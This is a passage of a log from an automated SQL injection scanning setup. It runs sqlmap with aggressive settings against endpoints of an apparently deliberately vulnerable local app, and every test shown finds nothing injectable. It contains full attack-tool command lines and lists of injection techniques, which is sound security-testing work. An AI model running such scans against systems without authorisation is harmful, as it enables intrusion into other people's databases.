INFO - [20:18:38] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
INFO - [20:18:38] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
INFO - [20:18:39] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
INFO - [20:18:39] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
INFO - [20:18:40] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
INFO - [20:18:40] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
INFO - [20:18:40] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
INFO - [20:18:40] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
INFO - [20:18:40] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
INFO - [20:18:40] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
INFO - [20:18:40] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
INFO - [20:18:40] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
INFO - [20:18:40] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
INFO - [20:18:40] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
INFO - [20:18:40] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
INFO - [20:18:40] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
INFO - [20:18:40] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
INFO - [20:18:40] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
INFO - [20:18:40] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
INFO - [20:18:40] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
INFO - [20:18:40] [INFO] testing 'Informix boolean-based blind - Parameter replace'
INFO - [20:18:40] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
INFO - [20:18:40] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
INFO - [20:18:40] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
INFO - [20:18:40] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
INFO - [20:18:40] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
INFO - [20:18:40] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
INFO - [20:18:40] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
INFO - [20:18:40] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:18:40] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:18:40] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:18:40] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:18:40] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:18:41] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
INFO - [20:18:41] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
INFO - [20:18:41] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
INFO - [20:18:41] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
INFO - [20:18:41] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:18:41] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:18:41] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:18:41] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:18:41] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:18:41] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:18:41] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
INFO - [20:18:41] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
INFO - [20:18:41] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
INFO - [20:18:41] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
INFO - [20:18:41] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
INFO - [20:18:41] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
INFO - [20:18:42] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
INFO - [20:18:42] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
INFO - [20:18:42] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
INFO - [20:18:42] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
INFO - [20:18:43] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
INFO - [20:18:43] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
INFO - [20:18:43] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
INFO - [20:18:44] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
INFO - [20:18:44] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
INFO - [20:18:45] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
INFO - [20:18:46] [WARNING] parameter 'Host' does not seem to be injectable
INFO - [20:18:46] [CRITICAL] all tested parameters do not appear to be injectable. Rerun without providing the option '--technique'. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
INFO - [20:18:46] [WARNING] HTTP error codes detected during run:
INFO - 405 (Method Not Allowed) - 5159 times, 404 (Not Found) - 2360 times
INFO - [*] ending @ 20:18:46 /2025-09-26/
INFO - No clear injection detected during discovery for http://localhost:5000/xxe
INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' --batch --flush-session -u http://localhost:5000/hello
INFO -        __H__
INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
INFO - [*] starting @ 20:18:49 /2025-09-26/
INFO - [20:18:51] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
INFO - do you want to try URI injections in the target URL itself? [Y/n/q] Y
INFO - [20:18:52] [INFO] flushing session file
INFO - [20:18:52] [INFO] testing connection to the target URL
INFO - [20:18:52] [INFO] checking if the target is protected by some kind of WAF/IPS
INFO - [20:18:52] [INFO] testing if the target URL content is stable
INFO - [20:18:52] [INFO] target URL content is stable
INFO - [20:18:52] [INFO] testing if URI parameter '#1*' is dynamic
INFO - [20:18:52] [WARNING] URI parameter '#1*' does not appear to be dynamic
INFO - [20:18:52] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
INFO - [20:18:52] [INFO] testing for SQL injection on URI parameter '#1*'
INFO - [20:18:52] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
INFO - [20:18:52] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
INFO - [20:18:52] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:18:52] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
INFO - [20:18:52] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
INFO - [20:18:52] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
INFO - [20:18:53] [INFO] testing 'Generic inline queries'
INFO - [20:18:53] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
INFO - [20:18:53] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
INFO - [20:18:53] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
INFO - [20:18:53] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
INFO - [20:18:53] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
INFO - [20:18:53] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
INFO - [20:18:53] [INFO] testing 'Oracle AND time-based blind'
INFO - it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
INFO - [20:18:53] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
INFO - [20:18:53] [WARNING] URI parameter '#1*' does not seem to be injectable
INFO - [20:18:53] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
INFO - [20:18:53] [WARNING] HTTP error codes detected during run:
INFO - 404 (Not Found) - 73 times
INFO - [*] ending @ 20:18:53 /2025-09-26/
INFO - Flushed sqlmap session for http://localhost:5000/hello (log: attack-logs-dynamic\Hello_flush.log)
INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u 'http://localhost:5000/hello?name=test' --output-dir 'attack-logs-dynamic\Hello_sqlmap' --batch --level=5 --risk=3 --threads 5 -p name --technique BU
INFO -        __H__
INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
INFO - [*] starting @ 20:18:56 /2025-09-26/
INFO - [20:18:58] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Hello_sqlmap' as the output directory
INFO - [20:18:59] [INFO] testing connection to the target URL
INFO - [20:18:59] [INFO] testing if the target URL content is stable
INFO - [20:18:59] [INFO] target URL content is stable
INFO - [20:18:59] [WARNING] heuristic (basic) test shows that GET parameter 'name' might not be injectable
INFO - [20:18:59] [INFO] heuristic (XSS) test shows that GET parameter 'name' might be vulnerable to cross-site scripting (XSS) attacks
INFO - [20:18:59] [INFO] testing for SQL injection on GET parameter 'name'
INFO - [20:18:59] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
INFO - [20:18:59] [WARNING] reflective value(s) found and filtering out
INFO - [20:19:01] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
INFO - [20:19:02] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
INFO - [20:19:03] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:19:04] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:19:05] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:19:05] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:19:05] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
INFO - [20:19:05] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
INFO - [20:19:06] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
INFO - [20:19:06] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
INFO - [20:19:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
INFO - [20:19:07] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
INFO - [20:19:08] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
INFO - [20:19:09] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
INFO - [20:19:10] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
INFO - [20:19:11] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
INFO - [20:19:12] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
INFO - [20:19:13] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:19:14] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:19:14] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
INFO - [20:19:15] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
INFO - [20:19:16] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
INFO - [20:19:17] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
INFO - [20:19:18] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
INFO - [20:19:19] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
INFO - [20:19:20] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
INFO - [20:19:20] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
INFO - [20:19:20] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
INFO - [20:19:20] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
INFO - [20:19:20] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
INFO - [20:19:20] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
INFO - [20:19:20] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
INFO - [20:19:20] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
INFO - [20:19:20] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
INFO - [20:19:20] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
INFO - [20:19:20] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
INFO - [20:19:20] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
INFO - [20:19:20] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
INFO - [20:19:20] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
INFO - [20:19:20] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
INFO - [20:19:20] [INFO] testing 'Informix boolean-based blind - Parameter replace'
INFO - [20:19:20] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
INFO - [20:19:20] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
INFO - [20:19:20] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
INFO - [20:19:20] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
INFO - [20:19:20] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
INFO - [20:19:20] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
INFO - [20:19:20] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
INFO - [20:19:21] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:19:21] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:19:21] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:19:21] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:19:21] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:19:21] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
INFO - [20:19:21] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
INFO - [20:19:21] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
INFO - [20:19:21] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
INFO - [20:19:21] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:19:21] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:19:21] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:19:21] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:19:21] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:19:21] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:19:21] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
INFO - [20:19:21] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
INFO - [20:19:21] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
INFO - [20:19:22] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
INFO - [20:19:23] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
INFO - [20:19:23] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
INFO - [20:19:24] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
INFO - [20:19:25] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
INFO - [20:19:25] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
INFO - [20:19:26] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
INFO - [20:19:27] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
INFO - [20:19:27] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
INFO - it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
INFO - [20:19:28] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
INFO - [20:19:28] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
INFO - [20:19:29] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
INFO - [20:19:29] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
INFO - [20:19:30] [WARNING] GET parameter 'name' does not seem to be injectable
INFO - [20:19:30] [CRITICAL] all tested parameters do not appear to be injectable. Rerun without providing the option '--technique'. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
INFO - [*] ending @ 20:19:30 /2025-09-26/
INFO - No clear injection detected during discovery for http://localhost:5000/hello
INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' --batch --flush-session -u http://localhost:5000/pickle --data test=1
INFO -        __H__
INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
INFO - [*] starting @ 20:19:33 /2025-09-26/
INFO - [20:19:35] [INFO] flushing session file
INFO - [20:19:35] [INFO] testing connection to the target URL
INFO - [20:19:36] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
INFO - [20:19:36] [INFO] checking if the target is protected by some kind of WAF/IPS
INFO - [20:19:36] [INFO] testing if the target URL content is stable
INFO - [20:19:36] [INFO] target URL content is stable
INFO - [20:19:36] [INFO] testing if POST parameter 'test' is dynamic
INFO - [20:19:36] [WARNING] POST parameter 'test' does not appear to be dynamic
INFO - [20:19:36] [WARNING] heuristic (basic) test shows that POST parameter 'test' might not be injectable
INFO - [20:19:36] [INFO] testing for SQL injection on POST parameter 'test'
INFO - [20:19:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
INFO - [20:19:36] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
INFO - [20:19:36] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:19:36] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
INFO - [20:19:36] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
INFO - [20:19:36] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
INFO - [20:19:36] [INFO] testing 'Generic inline queries'
INFO - [20:19:36] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
INFO - [20:19:37] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
INFO - [20:19:37] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
INFO - [20:19:37] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
INFO - [20:19:37] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
INFO - [20:19:37] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
INFO - [20:19:37] [INFO] testing 'Oracle AND time-based blind'
INFO - it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
INFO - [20:19:37] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
INFO - [20:19:37] [WARNING] POST parameter 'test' does not seem to be injectable
INFO - [20:19:37] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
INFO - [20:19:37] [WARNING] HTTP error codes detected during run:
INFO - 500 (Internal Server Error) - 75 times
INFO - [*] ending @ 20:19:37 /2025-09-26/
INFO - Flushed sqlmap session for http://localhost:5000/pickle (log: attack-logs-dynamic\Insecure_Deserialization_flush.log)
INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u http://localhost:5000/pickle --output-dir 'attack-logs-dynamic\Insecure_Deserialization_sqlmap' --batch --level=5 --risk=3 --threads 5 --technique BU
INFO -        __H__
INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
INFO - [*] starting @ 20:19:40 /2025-09-26/
INFO - [20:19:42] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Insecure_Deserialization_sqlmap' as the output directory
INFO - [20:19:43] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
INFO - do you want to try URI injections in the target URL itself? [Y/n/q] Y
INFO - [20:19:43] [INFO] testing connection to the target URL
INFO - [20:19:43] [WARNING] the web server responded with an HTTP error code (405) which could interfere with the results of the tests
INFO - [20:19:43] [INFO] testing if the target URL content is stable
INFO - [20:19:43] [INFO] target URL content is stable
INFO - [20:19:43] [INFO] testing if URI parameter '#1*' is dynamic
INFO - [20:19:43] [INFO] URI parameter '#1*' appears to be dynamic
INFO - [20:19:43] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
INFO - [20:19:43] [INFO] testing for SQL injection on URI parameter '#1*'
INFO - [20:19:44] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
INFO - [20:19:44] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
INFO - [20:19:45] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
INFO - [20:19:46] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:19:47] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:19:48] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:19:48] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:19:48] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
INFO - [20:19:48] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
INFO - [20:19:48] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
INFO - [20:19:49] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
INFO - [20:19:49] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
INFO - [20:19:50] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
INFO - [20:19:50] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
INFO - [20:19:51] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
INFO - [20:19:51] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
INFO - [20:19:52] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
INFO - [20:19:53] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
INFO - [20:19:53] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:19:54] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:19:55] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
INFO - [20:19:55] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
INFO - [20:19:56] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
INFO - [20:19:57] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
INFO - [20:19:57] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
INFO - [20:19:58] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
INFO - [20:19:59] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
INFO - [20:19:59] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
INFO - [20:19:59] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
INFO - [20:19:59] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
INFO - [20:19:59] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
INFO - [20:19:59] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
INFO - [20:19:59] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
INFO - [20:19:59] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
INFO - [20:19:59] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
INFO - [20:19:59] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
INFO - [20:19:59] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
INFO - [20:19:59] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
INFO - [20:19:59] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
INFO - [20:19:59] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
INFO - [20:19:59] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
INFO - [20:19:59] [INFO] testing 'Informix boolean-based blind - Parameter replace'
INFO - [20:19:59] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
INFO - [20:19:59] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
INFO - [20:19:59] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
INFO - [20:19:59] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
INFO - [20:19:59] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
INFO - [20:19:59] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
INFO - [20:19:59] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
INFO - [20:19:59] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
